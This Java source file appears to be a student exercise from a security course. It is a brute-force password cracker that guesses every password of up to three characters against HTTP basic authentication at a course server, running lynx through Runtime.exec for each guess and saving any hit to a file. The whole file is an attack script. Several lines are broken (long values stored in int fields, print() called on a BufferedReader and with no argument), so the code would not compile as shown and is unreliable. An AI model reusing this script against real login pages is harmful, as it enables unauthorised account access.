


import java.net.*;
import java.io.*;


public class BruteForce{

       private String passwd = "";  
       private String command = ""; 
       private BufferedReader in;   
       private PrintWriter  out;    

       private int startTime = 0;  
       private int endTime = 0;    
       private int totalTimes = 0; 
       
       private boolean bfind = false;
       
       private String str ="abcdefghlijkmnopqrstuvwxyz'ABCDEFGHLIJKMNOPQRSTUVWXYZ0123456789.";

       
       public BruteForce(){}

       
       public void doRequest(){
              startTime = System.currentTimeMillis();
              
              for(int i=0; i < str.length(); i++){
                   if(bfind) break;
                   for(int j=0; j < str.length(); j++){
                        if(bfind) break;
                        for(int k=0; k < str.length(); k++){
                            if(bfind) break;
                            passwd = String.valueOf(str.charAt(i))+ String.valueOf(str.charAt(j))
                                     +String.valueOf(str.charAt(k));
                            connection(passwd);
                        }
                    }
              }
              
              if(!bfind){
                 for(int i = 0; i < str.length(); i++){
                    if(bfind) break;
                    for(int j = 0; j<str.length(); j++){
                        if(bfind) break;
                        passwd = String.valueOf(str.charAt(i))+ String.valueOf(str.charAt(j));
                        connection(passwd);
                    }
                 }
              }
              
              if(!bfind){
                 for(int i = 0; i < str.length(); i++){
                     if(bfind) break;
                     passwd = String.valueOf(str.charAt(i));
                     connection(passwd);
                 }
              }
       }
       
       public void connection(String passwd){
              command = "lynx -head -dump http://sec-crack.cs.rmit.edu./SEC/2/index.php -auth=:";
              command = command + passwd;
              try{
                  System.out.println(passwd +"-->  Establishing a connection.");
                  Runtime runtime = Runtime.getRuntime();
                  Process p = runtime.exec(command);
                  in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                  String inStr;
                  while((inStr = in.readLine())!= null){
                        if(inStr.indexOf("HTTP/1.1 200") != -1 || inStr.indexOf("HTTP/1.0 200") != -1||
                            inStr.indexOf("HTTP/1.1 404") != -1 || inStr.indexOf("HTTP/1.0 404") != -1){
                            endTime = System.currentTimeMillis();
                            totalTimes = endTime - startTime;
                            System.out.println("\nBruteForce Crack PassWord successful! PassWord is " + passwd);
                            System.out.println("Total Times is " + totalTimes + " milliSec");
                            System.out.println("Writing it  brutepswd.txt file\n");
                            out = new PrintWriter(new BufferedWriter(new FileWriter("brutepswd.txt")));
                            out.println("BruteForce Crack PassWord Successful! Total Times: " + totalTimes + " milliSec");
                            out.println("Passwd: "+ passwd);
                            out.flush();
                            bfind = true;
                        }
                        out.print();
                  }
                  in.print();
              }catch(Exception e){System.out.println(e.getMessage());}
       }
       
       public String getAnyKey()throws Exception{
		      BufferedReader stdin =new BufferedReader(new InputStreamReader(System.in));
		      String key= stdin.readLine();
	          return key;
	   }
	   
       public static void main (String []args){

              BruteForce bf = new BruteForce();
              System.out.println("\n*******************************************");
              System.out.println("*                                         *");
              System.out.println("*     BruteForce Crack Passwd Program     *");
              System.out.println("*    ---------------------------------    *");
              System.out.println("*          Author:              *");
              System.out.println("*                                         *");
              System.out.println("*******************************************");
              System.out.println("\n  BruteForce Crack Passwd Information:\n");
              System.out.println("--> UserName: ");
              System.out.println("--> MaxPasswdLength: 3");
              System.out.println("--> URL: http://sec-crack.cs.rmit.edu./SEC/2/index.php");
              System.out.println("--> Alphabet: "+ bf.str+"\n");
              System.out.println("==> Press Ctrl+C  stop Crack\n");
              System.out.print("==> Press EnterKey  : ");
              try{
                  String key = bf.getAnyKey();
              }catch(Exception e){System.out.println(e.getMessage());}
              bf.doRequest();
       }
}